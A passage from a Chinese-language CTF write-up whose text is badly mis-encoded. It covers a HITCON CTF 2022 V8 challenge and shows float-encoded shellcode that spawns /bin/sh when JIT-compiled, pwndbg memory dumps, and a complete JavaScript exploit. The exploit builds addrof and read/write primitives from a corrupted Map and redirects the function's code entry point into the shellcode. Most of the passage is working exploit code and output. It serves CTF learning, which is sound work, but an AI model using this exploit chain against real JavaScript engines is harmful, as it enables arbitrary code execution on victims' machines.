<li>Êàë‰ª¨ÂèØ‰ª•ÂÅöÁöÑÊòØÂ∞ÜÊàë‰ª¨ÁöÑ shellcode ËΩ¨Êç¢‰∏∫ÊµÆÁÇπÊï∞Ôºå‰ª•‰æøÊàë‰ª¨ÁöÑÊµÆÁÇπÊï∞ÂçÅÂÖ≠ËøõÂà∂ÊåâÂéüÊ†∑Â≠òÂÇ®Âú® Jitted ÂáΩÊï∞Âå∫Âüü‰∏≠</li>
<li>ÂÆû‰æã‰ª£Á†ÅÂ¶Ç‰∏ãÔºö</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> foo = ()=&gt;</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> [<span class="number">1.0</span>,</span><br><span class="line">        <span class="number">1.95538254221075331056310651818E-246</span>,</span><br><span class="line">        <span class="number">1.95606125582421466942709801013E-246</span>,</span><br><span class="line">        <span class="number">1.99957147195425773436923756715E-246</span>,</span><br><span class="line">        <span class="number">1.95337673326740932133292175341E-246</span>,</span><br><span class="line">        <span class="number">2.63486047652296056448306022844E-284</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (let i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; i++) &#123;foo();foo();foo();foo();&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>JavaScript ‰∏≠ÂÆö‰πâÁöÑÊµÆÁÇπÂÆûÈôÖ‰∏äÊòØËµ∞ÁßÅÁöÑ shellcode</li>
<li>ÂÆÉÂ∞ÜÊâßË°å <code>sys_execve(&#39;/bin/sh&#39;)</code></li>
<li>Áî±‰∫éËØ•ÂáΩÊï∞Ë¢´Ë∞ÉÁî®‰∫ÜÂæàÂ§öÊ¨°ÔºåÂõ†Ê≠§ v8 Â∞ÜÂØπ‰ª£Á†ÅËøõË°å JITÔºàÂêØÁî® TURBOFANÔºâ</li>
</ul>
<p>‰ΩøÁî® GDB ÊâìÂç∞ÂÜÖÂ≠ò‰ø°ÊÅØÔºö</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">d8&gt; %DebugPrint(foo)</span><br><span class="line">DebugPrint: <span class="number">0xc25002c278d</span>: [Function] in OldSpace</span><br><span class="line"> - <span class="built_in">map</span>: <span class="number">0x0c2500184241</span> &lt;Map[<span class="number">28</span>](HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: <span class="number">0x0c25001840f5</span> &lt;JSFunction (sfi = <span class="number">0xc2500145dfd</span>)&gt;</span><br><span class="line"> - elements: <span class="number">0x0c2500002259</span> &lt;FixedArray[<span class="number">0</span>]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - function prototype: &lt;no-prototype-slot&gt;</span><br><span class="line"> - shared_info: <span class="number">0x0c2500199f11</span> &lt;SharedFunctionInfo foo&gt;</span><br><span class="line"> - name: <span class="number">0x0c2500199ea5</span> &lt;String[<span class="number">3</span>]: <span class="meta">#foo&gt;</span></span><br><span class="line"> - formal_parameter_count: <span class="number">0</span></span><br><span class="line"> - kind: ArrowFunction</span><br><span class="line"> - context: <span class="number">0x0c250019a005</span> &lt;ScriptContext[<span class="number">3</span>]&gt;</span><br><span class="line"> - code: <span class="number">0x0c250019a2dd</span> &lt;CodeDataContainer TURBOFAN&gt;</span><br><span class="line"> - source code: ()=&gt;</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> [<span class="number">1.0</span>,</span><br><span class="line">        <span class="number">1.95538254221075331056310651818E-246</span>,</span><br><span class="line">        <span class="number">1.95606125582421466942709801013E-246</span>,</span><br><span class="line">        <span class="number">1.99957147195425773436923756715E-246</span>,</span><br><span class="line">        <span class="number">1.95337673326740932133292175341E-246</span>,</span><br><span class="line">        <span class="number">2.63486047652296056448306022844E-284</span>];</span><br><span class="line">&#125;</span><br><span class="line"> - properties: <span class="number">0x0c2500002259</span> &lt;FixedArray[<span class="number">0</span>]&gt;</span><br><span class="line"> - <span class="function">All own <span class="title">properties</span> <span class="params">(excluding elements)</span>: </span>&#123;</span><br><span class="line">    <span class="number">0xc2500006551</span>: [String] in ReadOnlySpace: <span class="meta">#length: 0x0c25001442fd <span class="meta-string">&lt;AccessorInfo name= 0x0c2500006551 &lt;String[6]: #length&gt;</span>, data= 0x0c25000023e1 <span class="meta-string">&lt;undefined&gt;</span>&gt; (const accessor descriptor), location: descriptor</span></span><br><span class="line">    <span class="number">0xc2500006799</span>: [String] in ReadOnlySpace: <span class="meta">#name: 0x0c25001442e5 <span class="meta-string">&lt;AccessorInfo name= 0x0c2500006799 &lt;String[4]: #name&gt;</span>, data= 0x0c25000023e1 <span class="meta-string">&lt;undefined&gt;</span>&gt; (const accessor descriptor), location: descriptor</span></span><br><span class="line"> &#125;</span><br><span class="line"> - feedback <span class="built_in">vector</span>: <span class="number">0xc250019a0c9</span>: [FeedbackVector] in OldSpace</span><br><span class="line"> - <span class="built_in">map</span>: <span class="number">0x0c250000273d</span> &lt;Map(FEEDBACK_VECTOR_TYPE)&gt;</span><br><span class="line"> - length: <span class="number">1</span></span><br><span class="line"> - shared function info: <span class="number">0x0c2500199f11</span> &lt;SharedFunctionInfo foo&gt;</span><br><span class="line"> - no optimized code</span><br><span class="line"> - tiering state: TieringState::kNone</span><br><span class="line"> - maybe has maglev code: <span class="number">0</span></span><br><span class="line"> - maybe has turbofan code: <span class="number">0</span></span><br><span class="line"> - invocation count: <span class="number">214279</span></span><br><span class="line"> - profiler ticks: <span class="number">0</span></span><br><span class="line"> - closure feedback cell <span class="built_in">array</span>: <span class="number">0xc2500003511</span>: [ClosureFeedbackCellArray] in ReadOnlySpace</span><br><span class="line"> - <span class="built_in">map</span>: <span class="number">0x0c2500002981</span> &lt;Map(CLOSURE_FEEDBACK_CELL_ARRAY_TYPE)&gt;</span><br><span class="line"> - length: <span class="number">0</span></span><br><span class="line"></span><br><span class="line"> - slot #<span class="number">0</span> Literal  &#123;</span><br><span class="line">     [<span class="number">0</span>]: <span class="number">0x0c250019a185</span> &lt;AllocationSite&gt;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="number">0xc2500184241</span>: [Map] in OldSpace</span><br><span class="line"> - type: JS_FUNCTION_TYPE</span><br><span class="line"> - instance size: <span class="number">28</span></span><br><span class="line"> - inobject properties: <span class="number">0</span></span><br><span class="line"> - elements kind: HOLEY_ELEMENTS</span><br><span class="line"> - unused property fields: <span class="number">0</span></span><br><span class="line"> - <span class="class"><span class="keyword">enum</span> <span class="title">length</span>:</span> invalid</span><br><span class="line"> - callable</span><br><span class="line"> - back pointer: <span class="number">0x0c25000023e1</span> &lt;undefined&gt;</span><br><span class="line"> - prototype_validity cell: <span class="number">0x0c25001443cd</span> &lt;Cell value= <span class="number">1</span>&gt;</span><br><span class="line"> - instance descriptors (own) #<span class="number">2</span>: <span class="number">0x0c2500184269</span> &lt;DescriptorArray[<span class="number">2</span>]&gt;</span><br><span class="line"> - prototype: <span class="number">0x0c25001840f5</span> &lt;JSFunction (sfi = <span class="number">0xc2500145dfd</span>)&gt;</span><br><span class="line"> - constructor: <span class="number">0x0c2500002261</span> &lt;null&gt;</span><br><span class="line"> - dependent code: <span class="number">0x0c25000021e1</span> &lt;Other heap object (WEAK_ARRAY_LIST_TYPE)&gt;</span><br><span class="line"> - construction counter: <span class="number">0</span></span><br><span class="line"></span><br><span class="line">()=&gt;</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> [<span class="number">1.0</span>,</span><br><span class="line">        <span class="number">1.95538254221075331056310651818E-246</span>,</span><br><span class="line">        <span class="number">1.95606125582421466942709801013E-246</span>,</span><br><span class="line">        <span class="number">1.99957147195425773436923756715E-246</span>,</span><br><span class="line">        <span class="number">1.95337673326740932133292175341E-246</span>,</span><br><span class="line">        <span class="number">2.63486047652296056448306022844E-284</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>ËØ∑Ê≥®ÊÑèÔºå<code>foo</code> ÊñπÊ≥ï‰∏≠Êúâ‰∏Ä‰∏™Âêç‰∏∫ code ÁöÑÂ±ûÊÄßÔºåÂÖ∂‰∏≠Âü∫‰∫é gdb ‰∏≠ÁöÑÊ£ÄÊü•ÔºåÂÅèÁßªÈáè‰∏∫ <code>foo+0x18</code></li>
<li>Êé•‰∏ãÊù•ÊâìÂç∞ code Â±ûÊÄßÁöÑ‰ø°ÊÅØÔºö</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job <span class="number">0x0c250019a2dd</span></span><br><span class="line"><span class="number">0xc250019a2dd</span>: [CodeDataContainer] in OldSpace</span><br><span class="line"> - <span class="built_in">map</span>: <span class="number">0x0c2500002a71</span> &lt;Map[<span class="number">28</span>](CODE_DATA_CONTAINER_TYPE)&gt;</span><br><span class="line"> - kind: TURBOFAN</span><br><span class="line"> - is_off_heap_trampoline: <span class="number">0</span></span><br><span class="line"> - code: <span class="number">0x55e3400042c1</span> &lt;Code TURBOFAN&gt;</span><br><span class="line"> - code_entry_point: <span class="number">0x55e340004300</span></span><br><span class="line"> - kind_specific_flags: <span class="number">4</span></span><br></pre></td></tr></table></figure>
<ul>
<li>codeÔºöÊåáÂêë jitted code Âå∫ÂüüÔºà<code>code + 0x8</code>Ôºâ</li>
<li>code_entry_pointÔºöÊåáÂêë jitted code Êåá‰ª§ÁöÑÂºÄÂ§¥Ôºà<code>code + 0xc</code>Ôºâ</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job <span class="number">0x55e3400042c1</span> <span class="comment">/* jitted code */</span></span><br><span class="line"><span class="number">0x55e3400042c1</span>: [Code]</span><br><span class="line"> - <span class="built_in">map</span>: <span class="number">0x0c250000264d</span> &lt;Map(CODE_TYPE)&gt;</span><br><span class="line"> - code_data_container: <span class="number">0x0c250019a2dd</span> &lt;CodeDataContainer TURBOFAN&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x55e340004300</span> <span class="comment">/* code_entry_point */</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>‚îÇ  <span class="number">0x55e340004300</span> ‚óÇ‚Äî mov    ebx, dword ptr [rcx - <span class="number">0x30</span>]</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>‚îÇ  <span class="number">0x55e340004308</span> ‚óÇ‚Äî <span class="number">0x1fe88e70850f0117</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>‚îÇ  <span class="number">0x55e340004310</span> ‚óÇ‚Äî push   rbp</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>‚îÇ  <span class="number">0x55e340004318</span> ‚óÇ‚Äî sub    esp, <span class="number">8</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>‚îÇ  <span class="number">0x55e340004320</span> ‚óÇ‚Äî xchg   bl, bh</span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>‚îÇ  <span class="number">0x55e340004328</span> ‚óÇ‚Äî add    bh, cl</span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>‚îÇ  <span class="number">0x55e340004330</span> ‚óÇ‚Äî cmp    qword ptr [r13 + <span class="number">0xcf08</span>], rdi</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>‚îÇ  <span class="number">0x55e340004338</span> ‚óÇ‚Äî xchg   byte ptr [rbx], dl</span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>‚îÇ  <span class="number">0x55e340004340</span> ‚óÇ‚Äî cmp    byte ptr [rcx - <span class="number">0x77</span>], cl</span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>‚îÇ  <span class="number">0x55e340004348</span> ‚óÇ‚Äî add    rcx, <span class="number">1</span></span><br><span class="line"><span class="number">0</span>a:<span class="number">0050</span>‚îÇ  <span class="number">0x55e340004350</span> ‚óÇ‚Äî add    al, byte ptr [rax]</span><br><span class="line"><span class="number">0b</span>:<span class="number">0058</span>‚îÇ  <span class="number">0x55e340004358</span> ‚óÇ‚Äî add    ecx, dword ptr [r8 + rax]</span><br><span class="line"><span class="number">0</span>c:<span class="number">0060</span>‚îÇ  <span class="number">0x55e340004360</span> ‚óÇ‚Äî jbe    <span class="number">0x55e340004322</span></span><br><span class="line"><span class="number">0</span>d:<span class="number">0068</span>‚îÇ  <span class="number">0x55e340004368</span> ‚óÇ‚Äî stc    </span><br><span class="line"><span class="number">0</span>e:<span class="number">0070</span>‚îÇ  <span class="number">0x55e340004370</span> ‚óÇ‚Äî <span class="number">0x68732f68ba4907</span></span><br><span class="line"><span class="number">0f</span>:<span class="number">0078</span>‚îÇ  <span class="number">0x55e340004378</span> ‚óÇ‚Äî pop    rax</span><br></pre></td></tr></table></figure>
<p>‰ΩøÁî® WAAÔºåËÆ©Êàë‰ª¨ÈÄöËøáÁßªÂä®ÂÖ∂Â≠òÂÇ®ÂÄºÊù•Ë¶ÜÁõñÊ≠§ <code>code_entry_point</code>Ôºå‰ª•ÊåáÂêëÊàë‰ª¨ÁöÑÁ¨¨‰∏Ä‰∏™Ëµ∞ÁßÅ <code>shellcode</code>Ôºå‰ª•‰æøÂΩìÊàë‰ª¨Ë∞ÉÁî® <code>foo</code> Êó∂ÔºåÂÆÉÂ∞ÜË∑≥ËΩ¨Âπ∂ÊâßË°åÊàë‰ª¨ÊûÑÂª∫ÁöÑ <code>shellcode</code></p>
<ul>
<li>PSÔºöÊúÄÂ•ΩÂ∞ÜÁõÆÊ†á JIT ‰ª£Á†ÅÊîæÂú®Êñá‰ª∂ÁöÑÈ°∂ÈÉ®ÔºåËøôÊ†∑ÂÆÉÂ∞±‰∏ç‰ºöÂºÑ‰π±Êàë‰ª¨ÂàõÂª∫ÁöÑ WAA</li>
</ul>
<p>ÊúÄÂêéÁöÑÂÖ•‰æµÊ≠•È™§Ôºö</p>
<ul>
<li>ÊâßË°å <code>addrof(foo)</code> Ëé∑Âèñ <code>foo</code> ÂØπË±°ÁöÑÂú∞ÂùÄ</li>
<li>‰ΩøÁî® <code>weak_read</code> Ëé∑Âèñ <code>foo+0x18</code>Ôºà<code>foo-&gt;code</code>Ôºâ</li>
<li>‰ΩøÁî® <code>weak_read</code> Ëé∑Âèñ <code>foo-&gt;code+0xc</code>Ôºà<code>foo-&gt;code-&gt;code_entry_point</code>Ôºâ</li>
<li>‰ΩøÁî® <code>weak_write</code> Âú® <code>foo-&gt;code</code> Â§ÑË¶ÜÁõñ‰∏ä <code>foo-&gt;code-&gt;code_entry_point+shift_offset</code>ÔºàÂÖ∂‰∏≠ <code>shift_offset</code> ÊòØËµ∑Âßã JIT ‰ª£Á†ÅÊåá‰ª§Âà∞Ëµ∞ÁßÅÁöÑ <code>shellcode</code> ‰ª£Á†Å‰πãÈó¥ÁöÑË∑ùÁ¶ªÔºâ</li>
</ul>
<p>ÈÄöËøáË∞ÉËØïÊù•ÂØªÊâæ <code>shift_offset</code> ÁöÑÂÄºÔºö</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x5577a0004b00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>‚îÇ  <span class="number">0x5577a0004b00</span> ‚óÇ‚Äî mov    ebx, dword ptr [rcx - <span class="number">0x30</span>]</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>‚îÇ  <span class="number">0x5577a0004b08</span> ‚óÇ‚Äî <span class="number">0x1fe88670850f0117</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>‚îÇ  <span class="number">0x5577a0004b10</span> ‚óÇ‚Äî push   rbp</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>‚îÇ  <span class="number">0x5577a0004b18</span> ‚óÇ‚Äî sub    esp, <span class="number">8</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>‚îÇ  <span class="number">0x5577a0004b20</span> ‚óÇ‚Äî xchg   bl, bh</span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>‚îÇ  <span class="number">0x5577a0004b28</span> ‚óÇ‚Äî add    bh, cl</span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>‚îÇ  <span class="number">0x5577a0004b30</span> ‚óÇ‚Äî cmp    qword ptr [r13 + <span class="number">0xcf08</span>], rdi</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>‚îÇ  <span class="number">0x5577a0004b38</span> ‚óÇ‚Äî xchg   byte ptr [rbx], dl</span><br><span class="line">pwndbg&gt; </span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>‚îÇ  <span class="number">0x5577a0004b40</span> ‚óÇ‚Äî cmp    byte ptr [rcx - <span class="number">0x77</span>], cl</span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>‚îÇ  <span class="number">0x5577a0004b48</span> ‚óÇ‚Äî add    rcx, <span class="number">1</span></span><br><span class="line"><span class="number">0</span>a:<span class="number">0050</span>‚îÇ  <span class="number">0x5577a0004b50</span> ‚óÇ‚Äî add    al, byte ptr [rax]</span><br><span class="line"><span class="number">0b</span>:<span class="number">0058</span>‚îÇ  <span class="number">0x5577a0004b58</span> ‚óÇ‚Äî add    ecx, dword ptr [r8 + rax]</span><br><span class="line"><span class="number">0</span>c:<span class="number">0060</span>‚îÇ  <span class="number">0x5577a0004b60</span> ‚óÇ‚Äî jbe    <span class="number">0x5577a0004b22</span></span><br><span class="line"><span class="number">0</span>d:<span class="number">0068</span>‚îÇ  <span class="number">0x5577a0004b68</span> ‚óÇ‚Äî stc    </span><br><span class="line"><span class="number">0</span>e:<span class="number">0070</span>‚îÇ  <span class="number">0x5577a0004b70</span> ‚óÇ‚Äî <span class="number">0x68732f68ba4907</span></span><br><span class="line"><span class="number">0f</span>:<span class="number">0078</span>‚îÇ  <span class="number">0x5577a0004b78</span> ‚óÇ‚Äî pop    rax</span><br></pre></td></tr></table></figure>
<p>ÂÖ∂ÂÆûËøô‰∏™ <code>shellcode</code> ÁöÑÂºÄÂ§¥Êúâ‰∏ÄÂ§ÑÂæàÊòéÊòæÁöÑÁâπÂæÅÔºö</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:   <span class="number">68</span> <span class="number">2f</span> <span class="number">73</span> <span class="number">68</span> <span class="number">00</span>          push   <span class="number">0x68732f</span></span><br><span class="line"><span class="number">5</span>:   <span class="number">58</span>                      pop    rax</span><br><span class="line"><span class="number">6</span>:   eb <span class="number">0</span>c                   jmp    <span class="number">0x14</span></span><br></pre></td></tr></table></figure>
<ul>
<li>ÈÄöËøá <code>0x68732f</code> Â∞±ÂèØ‰ª•Âø´ÈÄüÂÆö‰Ωç <code>shellcode</code>Ôºö</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x5577a0004b00</span>+<span class="number">115</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>‚îÇ  <span class="number">0x5577a0004b73</span> ‚óÇ‚Äî push   <span class="number">0x68732f</span> <span class="comment">/* &#x27;h/sh&#x27; */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>‚îÇ  <span class="number">0x5577a0004b7b</span> ‚óÇ‚Äî vmovq  xmm0, r10</span><br></pre></td></tr></table></figure>
<ul>
<li><code>shift_offset</code> ÁöÑÂÄºÂ∞±ÊòØ‚Äú115‚Äù</li>
</ul>
<p>ÂÆåÊï¥ exp Â¶Ç‰∏ãÔºö</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> foo = <span class="function">()=&gt;</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> [<span class="number">1.0</span>,</span><br><span class="line">        <span class="number">1.95538254221075331056310651818E-246</span>,</span><br><span class="line">        <span class="number">1.95606125582421466942709801013E-246</span>,</span><br><span class="line">        <span class="number">1.99957147195425773436923756715E-246</span>,</span><br><span class="line">        <span class="number">1.95337673326740932133292175341E-246</span>,</span><br><span class="line">        <span class="number">2.63486047652296056448306022844E-284</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; i++) &#123;foo();foo();foo();foo();&#125;</span><br><span class="line"><span class="keyword">var</span> buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> f64_buf = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> u64_buf = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(buf);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ftoi</span>(<span class="params">val</span>) </span>&#123;</span><br><span class="line">    f64_buf[<span class="number">0</span>] = val;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">BigInt</span>(u64_buf[<span class="number">0</span>]) + (<span class="built_in">BigInt</span>(u64_buf[<span class="number">1</span>]) &lt;&lt; <span class="number">32n</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">itof</span>(<span class="params">val</span>) </span>&#123;</span><br><span class="line">    u64_buf[<span class="number">0</span>] = <span class="built_in">Number</span>(val &amp; <span class="number">0xffffffffn</span>);</span><br><span class="line">    u64_buf[<span class="number">1</span>] = <span class="built_in">Number</span>(val &gt;&gt; <span class="number">32n</span>);</span><br><span class="line">    <span class="keyword">return</span> f64_buf[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> c = [];</span><br><span class="line">m = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line">m.set(<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">m.set(c.hole(), <span class="number">1</span>);</span><br><span class="line">m.delete(c.hole());</span><br><span class="line">m.delete(c.hole());</span><br><span class="line">m.delete(<span class="number">1</span>);</span><br><span class="line">oob_arr = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">1.1</span>, <span class="number">2.2</span>);</span><br><span class="line">m.set(<span class="number">0x10</span>, -<span class="number">1</span>);</span><br><span class="line">m.set(oob_arr, <span class="number">0xffff</span>);</span><br><span class="line">victim = [&#123;&#125;, &#123;&#125;, &#123;&#125;, &#123;&#125;];</span><br><span class="line">read_gadget = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addrof</span>(<span class="params">in_obj</span>) </span>&#123;</span><br><span class="line">    mask = (<span class="number">1n</span> &lt;&lt; <span class="number">32n</span>) - <span class="number">1n</span></span><br><span class="line">    victim[<span class="number">0</span>] = in_obj;</span><br><span class="line">    <span class="keyword">return</span> ftoi(oob_arr[<span class="number">12</span>]) &amp; mask;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">weak_read</span>(<span class="params">addr</span>) </span>&#123;</span><br><span class="line">    oob_arr[<span class="number">37</span>] = itof(<span class="number">0x600000000n</span>+addr-<span class="number">0x8n</span>);</span><br><span class="line">    <span class="keyword">return</span> ftoi(read_gadget[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">weak_write</span>(<span class="params">addr, value</span>) </span>&#123;</span><br><span class="line">    oob_arr[<span class="number">37</span>] = itof(<span class="number">0x600000000n</span>+addr-<span class="number">0x8n</span>);</span><br><span class="line">    read_gadget[<span class="number">0</span>] = itof(value);</span><br><span class="line">&#125;</span><br><span class="line">f_foo = addrof(foo);</span><br><span class="line">f_code = weak_read(f_foo+<span class="number">0x18n</span>) &amp; ((<span class="number">1n</span> &lt;&lt; <span class="number">32n</span>) - <span class="number">1n</span>);</span><br><span class="line">f_code_code_entry_point = weak_read(f_code+<span class="number">0xcn</span>);</span><br><span class="line">weak_write(f_code+<span class="number">0xcn</span>, f_code_code_entry_point+<span class="number">115n</span>);</span><br><span class="line">foo();</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>Â∞èÁªìÔºö</strong></p>
<p>Êú¨‰∫∫ÂØπ V8 ‰∏çÊòØÂæà‰∫ÜËß£ÔºåÂè™ÊòØ‰πãÂâçÂ§çÁé∞Ëøá‰∏Ä‰∫õ JavaScript pwn</p>
<p>ÊØîËµõÊó∂ V8 ÁöÑÁéØÂ¢ÉÊàëÊê≠‰∫ÜÂæà‰πÖÔºåÊê≠Â•ΩÂêé‰πü‰∏ç‰ºöÂÅöÈ¢òÔºåËøô‰∏™È¢òÂ∞±ÂΩìÊòØ V8 ÂÖ•Èó®Âêß</p>
<p>ÂÖ®Á®ãÊ®°‰ªøÂÆòÊñπ wpÔºåÂéüÊñáÂ¶Ç‰∏ãÔºö</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://chovid99.github.io/posts/hitcon-ctf-2022/#the-corrupted-maps-impact">HITCON CTF 2022 | Welcome to Chovid99‚Äôs Blog</a></li>
</ul>
<p>ÊñáÁ´†ÂÖ®Ëã±ÊñáÔºåÈîªÁÇº‰∫Ü‰∏Ä‰∏ãÈòÖËØªËã±ËØ≠ËÆ∫ÊñáÁöÑËÉΩÂäõ</p>
<p>Â≠¶‰π†Âà∞ÁöÑÁü•ËØÜÂ¶Ç‰∏ãÔºö</p>
<ul>
